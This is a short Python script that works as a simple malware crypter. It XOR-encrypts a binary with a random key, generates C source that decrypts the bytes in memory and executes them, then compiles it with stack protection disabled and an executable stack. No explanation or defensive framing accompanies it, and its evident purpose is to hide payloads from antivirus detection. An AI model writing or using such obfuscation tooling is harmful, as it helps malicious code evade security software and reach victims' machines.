import os
import random

def crypt_binary(binary_path):
    with open(binary_path, 'rb') as f:
        data = f.read()
    
    key = random.randint(1, 255)
    encrypted = bytes([b ^ key for b in data])
    
    decryptor = f'''#include <stdio.h>
int main() {{
    unsigned char payload[] = {{{','.join(str(b) for b in encrypted)}}};
    int key = {key};
    for(int i=0; i<sizeof(payload); i++) payload[i] ^= key;
    void (*code)() = (void(*)())payload;
    code();
    return 0;
}}'''
    
    with open('/tmp/decryptor.c', 'w') as f:
        f.write(decryptor)
    
    os.system(f"gcc -O2 -fno-stack-protector -z execstack /tmp/decryptor.c -o {binary_path}.crypted")
    os.remove('/tmp/decryptor.c')
    
    return f"{binary_path}.crypted"